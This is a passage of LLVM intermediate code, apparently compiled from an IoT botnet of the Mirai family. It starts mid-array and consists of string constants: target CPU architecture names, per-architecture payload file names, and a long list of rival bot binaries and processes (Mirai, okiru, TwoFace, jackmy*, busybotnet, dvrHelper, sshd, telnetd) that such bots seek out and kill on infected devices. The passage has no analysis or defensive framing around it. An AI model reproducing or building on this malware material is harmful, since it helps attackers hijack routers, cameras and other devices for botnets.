i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.391, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.392, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.393, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.394, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.396, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.397, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.398, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.399, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.400, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.401, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.402, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.403, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.372, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.404, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.405, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.406, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.407, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.408, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.409, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.410, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.411, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.412, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.413, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.414, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.415, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.416, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.417, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.419, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.420, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.421, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.422, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.423, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.424, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.425, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.427, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.430, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.433, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.434, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.436, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.439, i32 0, i32 0)], align 16
@.str.91 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.92 = private unnamed_addr constant [7 x i8] c"mips64\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"sh2eb\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"sh2elf\00", align 1
@.str.96 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.97 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.98 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"armv5\00", align 1
@.str.100 = private unnamed_addr constant [8 x i8] c"armv4tl\00", align 1
@.str.101 = private unnamed_addr constant [6 x i8] c"armv4\00", align 1
@.str.102 = private unnamed_addr constant [6 x i8] c"armv6\00", align 1
@.str.103 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.104 = private unnamed_addr constant [8 x i8] c"powerpc\00", align 1
@.str.105 = private unnamed_addr constant [13 x i8] c"powerpc440fp\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"sparc\00", align 1
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.109 = private unnamed_addr constant [7 x i8] c"earyzq\00", align 1
@.str.110 = private unnamed_addr constant [7 x i8] c"cemtop\00", align 1
@.str.111 = private unnamed_addr constant [7 x i8] c"vtyhat\00", align 1
@.str.112 = private unnamed_addr constant [7 x i8] c"vvglma\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c"nvitpj\00", align 1
@.str.114 = private unnamed_addr constant [7 x i8] c"razdzn\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"lnkfmx\00", align 1
@.str.116 = private unnamed_addr constant [7 x i8] c"qvmxvl\00", align 1
@.str.117 = private unnamed_addr constant [7 x i8] c"ajoomk\00", align 1
@.str.118 = private unnamed_addr constant [7 x i8] c"fwdfvf\00", align 1
@.str.119 = private unnamed_addr constant [7 x i8] c"atxhua\00", align 1
@.str.120 = private unnamed_addr constant [7 x i8] c"qtmzbn\00", align 1
@.str.121 = private unnamed_addr constant [7 x i8] c"adcvds\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"amsjkfbns\00", align 1
@.str.123 = private unnamed_addr constant [9 x i8] c"xdf.mips\00", align 1
@.str.124 = private unnamed_addr constant [6 x i8] c"xdf.*\00", align 1
@.str.125 = private unnamed_addr constant [5 x i8] c"xdf*\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"xdf.mipsel\00", align 1
@.str.127 = private unnamed_addr constant [11 x i8] c"xdf.x86_64\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"xdf.arm7\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"xdf.ppc\00", align 1
@.str.130 = private unnamed_addr constant [16 x i8] c"hex**hexxdf.sh4\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.132 = private unnamed_addr constant [6 x i8] c"jack*\00", align 1
@.str.133 = private unnamed_addr constant [6 x i8] c"hack*\00", align 1
@.str.134 = private unnamed_addr constant [11 x i8] c"arm*tel*b1\00", align 1
@.str.135 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.136 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.137 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.138 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.139 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.140 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.141 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.142 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.143 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.144 = private unnamed_addr constant [6 x i8] c"orion\00", align 1
@.str.145 = private unnamed_addr constant [5 x i8] c"lol*\00", align 1
@.str.146 = private unnamed_addr constant [9 x i8] c"busybox*\00", align 1
@.str.147 = private unnamed_addr constant [8 x i8] c"badbox*\00", align 1
@.str.148 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.149 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.151 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.152 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.153 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.154 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.155 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.156 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.157 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.158 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.159 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.160 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.161 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.162 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.163 = private unnamed_addr constant [4 x i8] c"xx*\00", align 1
@.str.164 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.165 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.166 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.167 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.168 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.169 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.170 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.171 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.172 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.173 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.174 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.175 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.176 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.177 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.178 = private unnamed_addr constant [7 x i8] c"owari*\00", align 1
@.str.179 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.180 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.181 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.182 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.183 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.184 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.185 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.186 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.187 = private unnamed_addr constant [7 x i8] c"badbox\00", align 1
@.str.188 = private unnamed_addr constant [7 x i8] c"Mirai*\00", align 1
@.str.189 = private unnamed_addr constant [11 x i8] c"cunty*IoT*\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"jackmymips\00", align 1
@.str.191 = private unnamed_addr constant [13 x i8] c"jackmymips64\00", align 1
@.str.192 = private unnamed_addr constant [13 x i8] c"jackmymipsel\00", align 1
@.str.193 = private unnamed_addr constant [12 x i8] c"jackmysh2eb\00", align 1
@.str.194 = private unnamed_addr constant [13 x i8] c"jackmysh2elf\00", align 1
@.str.195 = private unnamed_addr constant [10 x i8] c"jackmysh4\00", align 1
@.str.196 = private unnamed_addr constant [10 x i8] c"jackmyx86\00", align 1
@.str.197 = private unnamed_addr constant [12 x i8] c"jackmyarmv5\00", align 1
@.str.198 = private unnamed_addr constant [14 x i8] c"jackmyarmv4tl\00", align 1
@.str.199 = private unnamed_addr constant [12 x i8] c"jackmyarmv4\00", align 1
@.str.200 = private unnamed_addr constant [12 x i8] c"jackmyarmv6\00", align 1
@.str.201 = private unnamed_addr constant [11 x i8] c"jackmyi686\00", align 1
@.str.202 = private unnamed_addr constant [14 x i8] c"jackmypowerpc\00", align 1
@.str.203 = private unnamed_addr constant [19 x i8] c"jackmypowerpc440fp\00", align 1
@.str.204 = private unnamed_addr constant [11 x i8] c"jackmyi586\00", align 1
@.str.205 = private unnamed_addr constant [11 x i8] c"jackmym68k\00", align 1
@.str.206 = private unnamed_addr constant [12 x i8] c"jackmysparc\00", align 1
@.str.207 = private unnamed_addr constant [13 x i8] c"jackmyx86_64\00", align 1
@.str.208 = private unnamed_addr constant [11 x i8] c"hackmymips\00", align 1
@.str.209 = private unnamed_addr constant [13 x i8] c"hackmymips64\00", align 1
@.str.210 = private unnamed_addr constant [13 x i8] c"hackmymipsel\00", align 1
@.str.211 = private unnamed_addr constant [12 x i8] c"hackmysh2eb\00", align 1
@.str.212 = private unnamed_addr constant [13 x i8] c"hackmysh2elf\00", align 1
@.str.213 = private unnamed_addr constant [10 x i8] c"hackmysh4\00", align 1
@.str.214 = private unnamed_addr constant [10 x i8] c"hackmyx86\00", align 1
@.str.215 = private unnamed_addr constant [12 x i8] c"hackmyarmv5\00", align 1
@.str.216 = private unnamed_addr constant [14 x i8] c"hackmyarmv4tl\00", align 1
@.str.217 = private unnamed_addr constant [12 x i8] c"hackmyarmv4\00", align 1
@.str.218 = private unnamed_addr constant [12 x i8] c"hackmyarmv6\00", align 1
@.str.219 = private unnamed_addr constant [11 x i8] c"hackmyi686\00", align 1
@.str.220 = private unnamed_addr constant [14 x i8] c"hackmypowerpc\00", align 1
@.str.221 = private unnamed_addr constant [19 x i8] c"hackmypowerpc440fp\00", align 1
@.str.222 = private unnamed_addr constant [11 x i8] c"hackmyi586\00", align 1
@.str.223 = private unnamed_addr constant [11 x i8] c"hackmym68k\00", align 1
@.str.224 = private unnamed_addr constant [12 x i8] c"hackmysparc\00", align 1
@.str.225 = private unnamed_addr constant [13 x i8] c"hackmyx86_64\00", align 1
@.str.226 = private unnamed_addr constant [4 x i8] c"b10\00", align 1
@.str.227 = private unnamed_addr constant [4 x i8] c"b11\00", align 1
@.str.228 = private unnamed_addr constant [4 x i8] c"b12\00", align 1
@.str.229 = private unnamed_addr constant [4 x i8] c"b13\00", align 1
@.str.230 = private unnamed_addr constant [4 x i8] c"b14\00", align 1
@.str.231 = private unnamed_addr constant [4 x i8] c"b15\00", align 1
@.str.232 = private unnamed_addr constant [4 x i8] c"b16\00", align 1
@.str.233 = private unnamed_addr constant [4 x i8] c"b17\00", align 1
@.str.234 = private unnamed_addr constant [4 x i8] c"b18\00", align 1
@.str.235 = private unnamed_addr constant [4 x i8] c"b19\00", align 1
@.str.236 = private unnamed_addr constant [4 x i8] c"b20\00", align 1
@.str.237 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.238 = private unnamed_addr constant [8 x i8] c"kmymips\00", align 1
@.str.239 = private unnamed_addr constant [10 x i8] c"kmymips64\00", align 1
@.str.240 = private unnamed_addr constant [10 x i8] c"kmymipsel\00", align 1
@.str.241 = private unnamed_addr constant [9 x i8] c"kmysh2eb\00", align 1
@.str.242 = private unnamed_addr constant [10 x i8] c"kmysh2elf\00", align 1
@.str.243 = private unnamed_addr constant [7 x i8] c"kmysh4\00", align 1
@.str.244 = private unnamed_addr constant [7 x i8] c"kmyx86\00", align 1
@.str.245 = private unnamed_addr constant [9 x i8] c"kmyarmv5\00", align 1
@.str.246 = private unnamed_addr constant [11 x i8] c"kmyarmv4tl\00", align 1
@.str.247 = private unnamed_addr constant [9 x i8] c"kmyarmv4\00", align 1
@.str.248 = private unnamed_addr constant [9 x i8] c"kmyarmv6\00", align 1
@.str.249 = private unnamed_addr constant [11 x i8] c"botkillme*\00", align 1
@.str.250 = private unnamed_addr constant [8 x i8] c"kmyi686\00", align 1
@.str.251 = private unnamed_addr constant [11 x i8] c"kmypowerpc\00", align 1
@.str.252 = private unnamed_addr constant [16 x i8] c"kmypowerpc440fp\00", align 1
@.str.253 = private unnamed_addr constant [8 x i8] c"kmyi586\00", align 1
@.str.254 = private unnamed_addr constant [8 x i8] c"kmym68k\00", align 1
@.str.255 = private unnamed_addr constant [9 x i8] c"kmysparc\00", align 1
@.str.256 = private unnamed_addr constant [8 x i8] c"lolmips\00", align 1
@.str.257 = private unnamed_addr constant [10 x i8] c"lolmips64\00", align 1
@.str.258 = private unnamed_addr constant [9 x i8] c"lolsh2eb\00", align 1
@.str.259 = private unnamed_addr constant [10 x i8] c"lolsh2elf\00", align 1
@.str.260 = private unnamed_addr constant [7 x i8] c"lolsh4\00", align 1
@.str.261 = private unnamed_addr constant [7 x i8] c"lolx86\00", align 1
@.str.262 = private unnamed_addr constant [9 x i8] c"lolarmv5\00", align 1
@.str.263 = private unnamed_addr constant [11 x i8] c"lolarmv4tl\00", align 1
@.str.264 = private unnamed_addr constant [9 x i8] c"lolarmv4\00", align 1
@.str.265 = private unnamed_addr constant [9 x i8] c"lolarmv6\00", align 1
@.str.266 = private unnamed_addr constant [8 x i8] c"loli686\00", align 1
@.str.267 = private unnamed_addr constant [12 x i8] c"mirai.linux\00", align 1
@.str.268 = private unnamed_addr constant [11 x i8] c"mirai.mips\00", align 1
@.str.269 = private unnamed_addr constant [11 x i8] c"lolpowerpc\00", align 1
@.str.270 = private unnamed_addr constant [16 x i8] c"lolpowerpc440fp\00", align 1
@.str.271 = private unnamed_addr constant [8 x i8] c"loli586\00", align 1
@.str.272 = private unnamed_addr constant [8 x i8] c"lolm68k\00", align 1
@.str.273 = private unnamed_addr constant [9 x i8] c"lolsparc\00", align 1
@.str.274 = private unnamed_addr constant [8 x i8] c"telmips\00", align 1
@.str.275 = private unnamed_addr constant [10 x i8] c"telmips64\00", align 1
@.str.276 = private unnamed_addr constant [10 x i8] c"telmipsel\00", align 1
@.str.277 = private unnamed_addr constant [9 x i8] c"telsh2eb\00", align 1
@.str.278 = private unnamed_addr constant [10 x i8] c"telsh2elf\00", align 1
@.str.279 = private unnamed_addr constant [7 x i8] c"telsh4\00", align 1
@.str.280 = private unnamed_addr constant [7 x i8] c"telx86\00", align 1
@.str.281 = private unnamed_addr constant [9 x i8] c"telarmv5\00", align 1
@.str.282 = private unnamed_addr constant [11 x i8] c"telarmv4tl\00", align 1
@.str.283 = private unnamed_addr constant [9 x i8] c"telarmv4\00", align 1
@.str.284 = private unnamed_addr constant [9 x i8] c"telarmv6\00", align 1
@.str.285 = private unnamed_addr constant [8 x i8] c"teli686\00", align 1
@.str.286 = private unnamed_addr constant [11 x i8] c"telpowerpc\00", align 1
@.str.287 = private unnamed_addr constant [16 x i8] c"telpowerpc440fp\00", align 1
@.str.288 = private unnamed_addr constant [8 x i8] c"teli586\00", align 1
@.str.289 = private unnamed_addr constant [8 x i8] c"telm68k\00", align 1
@.str.290 = private unnamed_addr constant [9 x i8] c"telsparc\00", align 1
@.str.291 = private unnamed_addr constant [10 x i8] c"telx86_64\00", align 1
@.str.292 = private unnamed_addr constant [12 x i8] c"TwoFacemips\00", align 1
@.str.293 = private unnamed_addr constant [14 x i8] c"TwoFacemips64\00", align 1
@.str.294 = private unnamed_addr constant [14 x i8] c"TwoFacemipsel\00", align 1
@.str.295 = private unnamed_addr constant [13 x i8] c"TwoFacesh2eb\00", align 1
@.str.296 = private unnamed_addr constant [14 x i8] c"TwoFacesh2elf\00", align 1
@.str.297 = private unnamed_addr constant [11 x i8] c"TwoFacesh4\00", align 1
@.str.298 = private unnamed_addr constant [11 x i8] c"TwoFacex86\00", align 1
@.str.299 = private unnamed_addr constant [13 x i8] c"TwoFacearmv5\00", align 1
@.str.300 = private unnamed_addr constant [15 x i8] c"TwoFacearmv4tl\00", align 1
@.str.301 = private unnamed_addr constant [13 x i8] c"TwoFacearmv4\00", align 1
@.str.302 = private unnamed_addr constant [13 x i8] c"TwoFacearmv6\00", align 1
@.str.303 = private unnamed_addr constant [12 x i8] c"TwoFacei686\00", align 1
@.str.304 = private unnamed_addr constant [15 x i8] c"TwoFacepowerpc\00", align 1
@.str.305 = private unnamed_addr constant [20 x i8] c"TwoFacepowerpc440fp\00", align 1
@.str.306 = private unnamed_addr constant [12 x i8] c"TwoFacei586\00", align 1
@.str.307 = private unnamed_addr constant [12 x i8] c"TwoFacem68k\00", align 1
@.str.308 = private unnamed_addr constant [13 x i8] c"TwoFacesparc\00", align 1
@.str.309 = private unnamed_addr constant [14 x i8] c"TwoFacex86_64\00", align 1
@.str.310 = private unnamed_addr constant [5 x i8] c"xxb1\00", align 1
@.str.311 = private unnamed_addr constant [5 x i8] c"xxb2\00", align 1
@.str.312 = private unnamed_addr constant [5 x i8] c"xxb3\00", align 1
@.str.313 = private unnamed_addr constant [5 x i8] c"xxb4\00", align 1
@.str.314 = private unnamed_addr constant [5 x i8] c"xxb5\00", align 1
@.str.315 = private unnamed_addr constant [5 x i8] c"xxb6\00", align 1
@.str.316 = private unnamed_addr constant [5 x i8] c"xxb7\00", align 1
@.str.317 = private unnamed_addr constant [5 x i8] c"xxb8\00", align 1
@.str.318 = private unnamed_addr constant [5 x i8] c"xxb9\00", align 1
@.str.319 = private unnamed_addr constant [6 x i8] c"xxb10\00", align 1
@.str.320 = private unnamed_addr constant [6 x i8] c"xxb11\00", align 1
@.str.321 = private unnamed_addr constant [6 x i8] c"xxb12\00", align 1
@.str.322 = private unnamed_addr constant [6 x i8] c"xxb13\00", align 1
@.str.323 = private unnamed_addr constant [6 x i8] c"xxb14\00", align 1
@.str.324 = private unnamed_addr constant [6 x i8] c"xxb15\00", align 1
@.str.325 = private unnamed_addr constant [6 x i8] c"xxb16\00", align 1
@.str.326 = private unnamed_addr constant [6 x i8] c"xxb17\00", align 1
@.str.327 = private unnamed_addr constant [6 x i8] c"xxb18\00", align 1
@.str.328 = private unnamed_addr constant [6 x i8] c"xxb19\00", align 1
@.str.329 = private unnamed_addr constant [6 x i8] c"xxb20\00", align 1
@.str.330 = private unnamed_addr constant [3 x i8] c"bb\00", align 1
@.str.331 = private unnamed_addr constant [11 x i8] c"busybotnet\00", align 1
@.str.332 = private unnamed_addr constant [5 x i8] c"pppd\00", align 1
@.str.333 = private unnamed_addr constant [6 x i8] c"pppoe\00", align 1
@.str.334 = private unnamed_addr constant [5 x i8] c"wput\00", align 1
@.str.335 = private unnamed_addr constant [4 x i8] c"DVR\00", align 1
@.str.336 = private unnamed_addr constant [7 x i8] c"*mirai\00", align 1
@.str.337 = private unnamed_addr constant [8 x i8] c"*.mirai\00", align 1
@.str.338 = private unnamed_addr constant [7 x i8] c"cunty*\00", align 1
@.str.339 = private unnamed_addr constant [3 x i8] c"pc\00", align 1
@.str.340 = private unnamed_addr constant [11 x i8] c"orion.mips\00", align 1
@.str.341 = private unnamed_addr constant [11 x i8] c"okiru.mips\00", align 1
@.str.342 = private unnamed_addr constant [15 x i8] c"nightcore.mips\00", align 1
@.str.343 = private unnamed_addr constant [3 x i8] c"ar\00", align 1
@.str.344 = private unnamed_addr constant [9 x i8] c"lsp.modz\00", align 1
@.str.345 = private unnamed_addr constant [11 x i8] c"nightcore*\00", align 1
@.str.346 = private unnamed_addr constant [6 x i8] c"netis\00", align 1
@.str.347 = private unnamed_addr constant [7 x i8] c"mipsxd\00", align 1
@.str.348 = private unnamed_addr constant [9 x i8] c"die.mips\00", align 1
@.str.349 = private unnamed_addr constant [13 x i8] c"dupessh*mips\00", align 1
@.str.350 = private unnamed_addr constant [7 x i8] c"linux*\00", align 1
@.str.351 = private unnamed_addr constant [7 x i8] c"mirai*\00", align 1
@.str.352 = private unnamed_addr constant [7 x i8] c"*.mips\00", align 1
@.str.353 = private unnamed_addr constant [4 x i8] c"pps\00", align 1
@.str.354 = private unnamed_addr constant [5 x i8] c"sh4*\00", align 1
@.str.355 = private unnamed_addr constant [6 x i8] c"wget*\00", align 1
@.str.356 = private unnamed_addr constant [5 x i8] c"ssh*\00", align 1
@.str.357 = private unnamed_addr constant [7 x i8] c"vulcan\00", align 1
@.str.358 = private unnamed_addr constant [10 x i8] c"jennifer*\00", align 1
@.str.359 = private unnamed_addr constant [7 x i8] c"okiru*\00", align 1
@.str.360 = private unnamed_addr constant [8 x i8] c"vulcana\00", align 1
@.str.361 = private unnamed_addr constant [8 x i8] c"vulcanb\00", align 1
@.str.362 = private unnamed_addr constant [8 x i8] c"vulcand\00", align 1
@.str.363 = private unnamed_addr constant [8 x i8] c"vulcane\00", align 1
@.str.364 = private unnamed_addr constant [8 x i8] c"vulcanx\00", align 1
@.str.365 = private unnamed_addr constant [8 x i8] c"vulcany\00", align 1
@.str.366 = private unnamed_addr constant [8 x i8] c"vulcanz\00", align 1
@.str.367 = private unnamed_addr constant [8 x i8] c"vulcang\00", align 1
@.str.368 = private unnamed_addr constant [8 x i8] c"vulcan*\00", align 1
@.str.369 = private unnamed_addr constant [8 x i8] c"apache2\00", align 1
@.str.370 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.371 = private unnamed_addr constant [7 x i8] c"gaybot\00", align 1
@.str.372 = private unnamed_addr constant [8 x i8] c"qghiqgd\00", align 1
@.str.373 = private unnamed_addr constant [8 x i8] c"cdnnqkk\00", align 1
@.str.374 = private unnamed_addr constant [8 x i8] c"uhnvepy\00", align 1
@.str.375 = private unnamed_addr constant [8 x i8] c"zrzyqyc\00", align 1
@.str.376 = private unnamed_addr constant [8 x i8] c"zvkghct\00", align 1
@.str.377 = private unnamed_addr constant [8 x i8] c"mykzydo\00", align 1
@.str.378 = private unnamed_addr constant [8 x i8] c"yyfizcz\00", align 1
@.str.379 = private unnamed_addr constant [8 x i8] c"zjevbar\00", align 1
@.str.380 = private unnamed_addr constant [8 x i8] c"lowssdj\00", align 1
@.str.381 = private unnamed_addr constant [8 x i8] c"aexpcjr\00", align 1
@.str.382 = private unnamed_addr constant [8 x i8] c"qssyevb\00", align 1
@.str.383 = private unnamed_addr constant [8 x i8] c"gcjiyol\00", align 1
@.str.384 = private unnamed_addr constant [8 x i8] c"inlxqjm\00", align 1
@.str.385 = private unnamed_addr constant [8 x i8] c"swgypcx\00", align 1
@.str.386 = private unnamed_addr constant [8 x i8] c"whsilop\00", align 1
@.str.387 = private unnamed_addr constant [8 x i8] c"ezmjymp\00", align 1
@.str.388 = private unnamed_addr constant [8 x i8] c"huscmww\00", align 1
@.str.389 = private unnamed_addr constant [8 x i8] c"pbhcocg\00", align 1
@.str.390 = private unnamed_addr constant [4 x i8] c"unk\00", align 1
@.str.391 = private unnamed_addr constant [5 x i8] c"unk*\00", align 1
@.str.392 = private unnamed_addr constant [5 x i8] c"unk1\00", align 1
@.str.393 = private unnamed_addr constant [5 x i8] c"unk2\00", align 1
@.str.394 = private unnamed_addr constant [5 x i8] c"unk3\00", align 1
@.str.395 = private unnamed_addr constant [5 x i8] c"unk4\00", align 1
@.str.396 = private unnamed_addr constant [7 x i8] c"smbvar\00", align 1
@.str.397 = private unnamed_addr constant [5 x i8] c"cert\00", align 1
@.str.398 = private unnamed_addr constant [10 x i8] c"neoisgay1\00", align 1
@.str.399 = private unnamed_addr constant [6 x i8] c"migg*\00", align 1
@.str.400 = private unnamed_addr constant [6 x i8] c"*ntpd\00", align 1
@.str.401 = private unnamed_addr constant [6 x i8] c"*sshd\00", align 1
@.str.402 = private unnamed_addr constant [10 x i8] c"miggsntpd\00", align 1
@.str.403 = private unnamed_addr constant [10 x i8] c"miggssshd\00", align 1
@.str.404 = private unnamed_addr constant [8 x i8] c"glbkjrn\00", align 1
@.str.405 = private unnamed_addr constant [8 x i8] c"vlbebuw\00", align 1
@.str.406 = private unnamed_addr constant [8 x i8] c"vqvdszx\00", align 1
@.str.407 = private unnamed_addr constant [8 x i8] c"ybahlvc\00", align 1
@.str.408 = private unnamed_addr constant [8 x i8] c"ttyuceq\00", align 1
@.str.409 = private unnamed_addr constant [8 x i8] c"keansia\00", align 1
@.str.410 = private unnamed_addr constant [8 x i8] c"scplnrh\00", align 1
@.str.411 = private unnamed_addr constant [8 x i8] c"eyqpmcb\00", align 1
@.str.412 = private unnamed_addr constant [8 x i8] c"thwbaja\00", align 1
@.str.413 = private unnamed_addr constant [8 x i8] c"ugenuge\00", align 1
@.str.414 = private unnamed_addr constant [8 x i8] c"pfdbupp\00", align 1
@.str.415 = private unnamed_addr constant [8 x i8] c"djnkpip\00", align 1
@.str.416 = private unnamed_addr constant [8 x i8] c"xvurmuo\00", align 1
@.str.417 = private unnamed_addr constant [8 x i8] c"xzywnsq\00", align 1
@.str.418 = private unnamed_addr constant [8 x i8] c"lztuvaq\00", align 1
@.str.419 = private unnamed_addr constant [8 x i8] c"pducsnb\00", align 1
@.str.420 = private unnamed_addr constant [8 x i8] c"adgjedp\00", align 1
@.str.421 = private unnamed_addr constant [8 x i8] c"khnklhx\00", align 1
@.str.422 = private unnamed_addr constant [7 x i8] c"svjqtj\00", align 1
@.str.423 = private unnamed_addr constant [7 x i8] c"yolwdx\00", align 1
@.str.424 = private unnamed_addr constant [7 x i8] c"aveckh\00", align 1
@.str.425 = private unnamed_addr constant [7 x i8] c"mltnkv\00", align 1
@.str.426 = private unnamed_addr constant [7 x i8] c"sawvqb\00", align 1
